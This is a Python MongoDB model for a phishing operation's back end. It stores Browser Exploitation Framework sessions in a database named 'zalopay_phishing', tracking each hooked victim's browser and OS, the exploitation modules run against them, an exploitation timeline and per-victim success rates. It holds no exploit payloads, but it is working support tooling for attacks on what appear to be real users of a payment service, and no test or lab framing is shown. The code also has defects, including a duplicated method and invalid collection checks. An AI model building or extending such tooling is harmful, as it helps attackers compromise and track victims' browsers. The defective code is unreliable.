"""
BeEF Sessions Model
Database operations for BeEF sessions collection
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.errors import PyMongoError

logger = logging.getLogger(__name__)

class BeEFSessionModel:
    """BeEF sessions database operations"""

    def __init__(self, mongodb_client: Optional[MongoClient] = None):
        self.client = mongodb_client
        self.db = None
        self.collection = None

    async def connect(self, database_name: str = "zalopay_phishing"):
        """Connect to MongoDB"""
        try:
            if self.client:
                self.db = self.client[database_name]
                self.collection = self.db.beef_sessions
                logger.info("Connected to BeEF sessions collection")
                return True
            return False
        except PyMongoError as e:
            logger.error(f"MongoDB connection error: {e}")
            return False

    async def create_beef_session(self, session_data: Dict[str, Any]) -> Optional[str]:
        """Create a new BeEF session record"""
        try:
            if not self.collection:
                await self.connect()

            # Add metadata
            session_data["created_at"] = datetime.now(timezone.utc)
            session_data["updated_at"] = datetime.now(timezone.utc)
            
            # Insert document
            result = self.collection.insert_one(session_data)
            
            if result.inserted_id:
                logger.info(f"BeEF session created: {result.inserted_id}")
                return str(result.inserted_id)
            else:
                logger.error("Failed to create BeEF session")
                return None

        except PyMongoError as e:
            logger.error(f"Error creating BeEF session: {e}")
            return None

    async def get_session_by_id(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get BeEF session by ID"""
        try:
            if not self.collection:
                await self.connect()

            session = self.collection.find_one({"_id": session_id})
            
            if session:
                session["_id"] = str(session["_id"])
                return session
            
            return None

        except PyMongoError as e:
            logger.error(f"Error getting BeEF session by ID: {e}")
            return None

    async def get_sessions_by_victim_id(self, victim_id: str) -> List[Dict[str, Any]]:
        """Get all BeEF sessions for a specific victim"""
        try:
            if not self.collection:
                await self.connect()

            sessions = list(self.collection.find(
                {"victim_id": victim_id},
                sort=[("created_at", -1)]
            ))

            # Convert ObjectId to string
            for session in sessions:
                session["_id"] = str(session["_id"])

            return sessions

        except PyMongoError as e:
            logger.error(f"Error getting BeEF sessions by victim ID: {e}")
            return []

    async def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get all active BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            sessions = list(self.collection.find(
                {"beef_session.status": "active"},
                sort=[("created_at", -1)]
            ))

            # Convert ObjectId to string
            for session in sessions:
                session["_id"] = str(session["_id"])

            return sessions

        except PyMongoError as e:
            logger.error(f"Error getting active BeEF sessions: {e}")
            return []

    async def update_session_status(self, session_id: str, status: str) -> bool:
        """Update BeEF session status"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "beef_session.status": status,
                "beef_session.last_seen": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"_id": session_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"BeEF session status updated: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session updated: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating BeEF session status: {e}")
            return False

    async def add_command_result(self, session_id: str, command_id: str, module: str, 
                                parameters: Dict[str, Any], result: Dict[str, Any]) -> bool:
        """Add command execution result to BeEF session"""
        try:
            if not self.collection:
                await self.connect()

            command_record = {
                "command_id": command_id,
                "module": module,
                "parameters": parameters,
                "executed_at": datetime.now(timezone.utc),
                "result": result
            }

            update_data = {
                "$push": {"commands_executed": command_record},
                "$inc": {
                    "intelligence_summary.total_commands_executed": 1,
                    "intelligence_summary.successful_commands": 1 if result.get("success") else 0
                },
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"_id": session_id},
                update_data
            )

            if result.modified_count > 0:
                logger.info(f"Command result added to BeEF session: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session updated with command result: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error adding command result to BeEF session: {e}")
            return False

    async def update_exploitation_timeline(self, session_id: str, phase: str, 
                                         commands: List[str]) -> bool:
        """Update exploitation timeline for BeEF session"""
        try:
            if not self.collection:
                await self.connect()

            timeline_entry = {
                "phase": phase,
                "start_time": datetime.now(timezone.utc),
                "end_time": datetime.now(timezone.utc),
                "commands": commands
            }

            update_data = {
                "$push": {"exploitation_timeline": timeline_entry},
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"_id": session_id},
                update_data
            )

            if result.modified_count > 0:
                logger.info(f"Exploitation timeline updated for BeEF session: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session updated with timeline: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating exploitation timeline: {e}")
            return False

    async def update_intelligence_summary(self, session_id: str, 
                                        intelligence_data: Dict[str, Any]) -> bool:
        """Update intelligence summary for BeEF session"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "intelligence_summary": intelligence_data,
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"_id": session_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"Intelligence summary updated for BeEF session: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session updated with intelligence: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating intelligence summary: {e}")
            return False

    async def close_session(self, session_id: str) -> bool:
        """Close BeEF session"""
        try:
            if not self.collection:
                await self.connect()

            update_data = {
                "beef_session.status": "inactive",
                "beef_session.last_seen": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            }

            result = self.collection.update_one(
                {"_id": session_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"BeEF session closed: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session closed: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error closing BeEF session: {e}")
            return False

    async def delete_session(self, session_id: str) -> bool:
        """Delete BeEF session"""
        try:
            if not self.collection:
                await self.connect()

            result = self.collection.delete_one({"_id": session_id})

            if result.deleted_count > 0:
                logger.info(f"BeEF session deleted: {session_id}")
                return True
            else:
                logger.warning(f"No BeEF session deleted: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error deleting BeEF session: {e}")
            return False

    async def count_total_sessions(self) -> int:
        """Count total BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            count = self.collection.count_documents({})
            return count

        except PyMongoError as e:
            logger.error(f"Error counting total BeEF sessions: {e}")
            return 0

    async def count_active_sessions(self) -> int:
        """Count active BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            count = self.collection.count_documents(
                {"beef_session.status": "active"}
            )
            return count

        except PyMongoError as e:
            logger.error(f"Error counting active BeEF sessions: {e}")
            return 0

    async def count_total_commands(self) -> int:
        """Count total commands executed across all sessions"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "total_commands": {
                            "$sum": "$intelligence_summary.total_commands_executed"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["total_commands"] if result else 0

        except PyMongoError as e:
            logger.error(f"Error counting total BeEF commands: {e}")
            return 0

    async def count_successful_commands(self) -> int:
        """Count successful commands executed across all sessions"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "successful_commands": {
                            "$sum": "$intelligence_summary.successful_commands"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["successful_commands"] if result else 0

        except PyMongoError as e:
            logger.error(f"Error counting successful BeEF commands: {e}")
            return 0

    async def get_average_success_rate(self) -> float:
        """Get average success rate across all sessions"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "average_success_rate": {
                            "$avg": "$intelligence_summary.overall_success_rate"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["average_success_rate"] if result and result[0]["average_success_rate"] else 0.0

        except PyMongoError as e:
            logger.error(f"Error getting average BeEF success rate: {e}")
            return 0.0

    async def get_recent_sessions(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            sessions = list(self.collection.find(
                {},
                sort=[("created_at", -1)],
                limit=limit,
                projection={
                    "victim_id": 1,
                    "beef_session.hook_id": 1,
                    "beef_session.status": 1,
                    "beef_session.injection_time": 1,
                    "browser_intelligence.browser": 1,
                    "browser_intelligence.os": 1,
                    "intelligence_summary.total_commands_executed": 1,
                    "intelligence_summary.successful_commands": 1,
                    "created_at": 1
                }
            ))

            # Convert ObjectId to string
            for session in sessions:
                session["_id"] = str(session["_id"])

            return sessions

        except PyMongoError as e:
            logger.error(f"Error getting recent BeEF sessions: {e}")
            return []

    async def get_session_statistics_by_victim(self, victim_id: str) -> Dict[str, Any]:
        """Get BeEF session statistics for a specific victim"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {"$match": {"victim_id": victim_id}},
                {
                    "$group": {
                        "_id": None,
                        "total_sessions": {"$sum": 1},
                        "active_sessions": {
                            "$sum": {"$cond": [{"$eq": ["$beef_session.status", "active"]}, 1, 0]}
                        },
                        "total_commands": {
                            "$sum": "$intelligence_summary.total_commands_executed"
                        },
                        "successful_commands": {
                            "$sum": "$intelligence_summary.successful_commands"
                        },
                        "average_success_rate": {
                            "$avg": "$intelligence_summary.overall_success_rate"
                        },
                        "first_session": {"$min": "$created_at"},
                        "last_session": {"$max": "$created_at"}
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            if result:
                stats = result[0]
                stats["success_rate"] = (
                    stats["successful_commands"] / stats["total_commands"]
                    if stats["total_commands"] > 0 else 0
                )
                return stats
            else:
                return {
                    "total_sessions": 0,
                    "active_sessions": 0,
                    "total_commands": 0,
                    "successful_commands": 0,
                    "success_rate": 0,
                    "average_success_rate": 0.0,
                    "first_session": None,
                    "last_session": None
                }

        except PyMongoError as e:
            logger.error(f"Error getting BeEF session statistics by victim: {e}")
            return {}

    async def cleanup_expired_sessions(self, days_to_keep: int = 30) -> int:
        """Clean up expired BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_to_keep)
            
            result = self.collection.delete_many({
                "beef_session.status": {"$in": ["inactive", "expired"]},
                "updated_at": {"$lt": cutoff_date}
            })

            deleted_count = result.deleted_count
            if deleted_count > 0:
                logger.info(f"Cleaned up {deleted_count} expired BeEF sessions")

            return deleted_count

        except PyMongoError as e:
            logger.error(f"Error cleaning up expired BeEF sessions: {e}")
            return 0

    async def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get active BeEF sessions"""
        try:
            if not self.collection:
                await self.connect()

            sessions = list(self.collection.find(
                {"beef_session.status": "active"},
                sort=[("created_at", -1)]
            ))

            # Convert ObjectId to string
            for session in sessions:
                session["_id"] = str(session["_id"])

            return sessions

        except PyMongoError as e:
            logger.error(f"Error getting active BeEF sessions: {e}")
            return []

    async def health_check(self) -> bool:
        """Health check for BeEF sessions collection"""
        try:
            if not self.collection:
                await self.connect()

            # Test basic operations
            self.collection.find_one()
            return True

        except PyMongoError as e:
            logger.error(f"BeEF sessions health check failed: {e}")
            return False